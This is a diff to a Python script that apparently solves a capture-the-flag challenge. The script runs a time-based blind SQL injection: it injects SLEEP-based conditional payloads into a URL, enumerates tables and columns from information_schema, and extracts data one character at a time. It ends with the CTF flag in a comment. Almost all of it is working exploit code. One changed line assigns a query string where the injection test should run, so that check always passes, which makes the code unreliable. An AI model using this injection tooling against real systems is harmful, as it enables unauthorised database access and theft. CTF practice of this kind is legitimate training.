@@ -33,7 +33,8 @@ def test_injection(sql_condition, sleep_time=2):
     Returns True if the query causes a delay (meaning the condition is TRUE)
     """
     # Use the payload format identified by sqlmap
-    payload = f"1' OR (SELECT IF({sql_condition}, SLEEP({sleep_time}), 0))-- -"
+    payload = f"1' OR (SELECT IF(({
+        sql_condition})*1, SLEEP({sleep_time}), 0))-- -"
     full_url = base_url + payload
 
     print(f"Testing: {full_url}")
@@ -100,8 +101,8 @@ def enumerate_columns(table_name):
 
         # Check if this prefix is a complete column name
         if prefix:
-            is_complete = test_injection(f"EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name = '{
-                                         table_name}' AND column_name = '{prefix}')")
+            is_complete = f"(SELECT COUNT(*) FROM information_schema.columns WHERE IF(table_name = '{
+                table_name}', IF(column_name = '{prefix}%', 1, 0), 0) = 1) > 0"
             if is_complete:
                 print(f"[+] Found column: '{prefix}'")
                 found_columns.append(prefix)
@@ -109,8 +110,9 @@ def enumerate_columns(table_name):
         # Try extending the prefix with each possible character
         for char in COL_CHARSET:
             new_prefix = prefix + char
-            sql_check = f"EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name = '{
-                table_name}' AND column_name LIKE '{new_prefix}%')"
+
+            sql_check = f"(SELECT COUNT(*) FROM information_schema.columns WHERE IF(table_name = '{
+                table_name}', IF(column_name LIKE '{new_prefix}%', 1, 0), 0) = 1) > 0"
 
             if test_injection(sql_check):
                 print(f"[+] Found column prefix: '{new_prefix}'")
@@ -158,9 +160,9 @@ def extract_string(query, max_length=50):
     result = ""
     for pos in range(1, max_length + 1):
         found = False
-        for char in string.printable:
+        for char in COL_CHARSET:
             # Check if character at position matches
-            condition = f"SUBSTRING(({query}), {pos}, 1) = '{char}'"
+            condition = f"SUBSTRING(({query}), {pos}, 1) LIKE '{char}'"
             if test_injection(condition):
                 result += char
                 found = True
@@ -168,7 +170,9 @@ def extract_string(query, max_length=50):
                 break
 
         if not found:
-            break
+            print(f"[-] No character found at position {pos}")
+            # add ? char
+            result += '?'
 
     return result
 
@@ -179,19 +183,26 @@ def main():
     # Find all table names
     print("[*] Attempting to enumerate table names...")
     # tables = find_table_names_recursive()
-    tables = ['flaggy', 'global_status',
-              'global_variables', 'persisted_variables', 'users']
+    # tables = ['flaggy', 'global_status',
+    #           'global_variables', 'persisted_variables', 'users']
+    tables = ['flaggy']
     print(f"[+] Found tables: {tables}")
+    columns = {
+        'flaggy': ['play', 'now'],
+    }
 
     # For each table, find columns and extract data
     for table in tables:
-        columns = enumerate_columns(table)
-        print(f"[+] Columns in {table}: {columns}")
+        if table not in columns:
+            columns[table] = enumerate_columns(table)
+            print(f"[+] Columns in {table}: {columns}")
 
-        if columns:
-            data = extract_data(table, columns)
+        if columns[table]:
+            data = extract_data(table, columns[table])
             print(f"[+] Data from {table}: {data}")
 
 
 if __name__ == "__main__":
     main()
+
+# CCIT{Bl4ckl1sts_Ar3_s0_c00l}
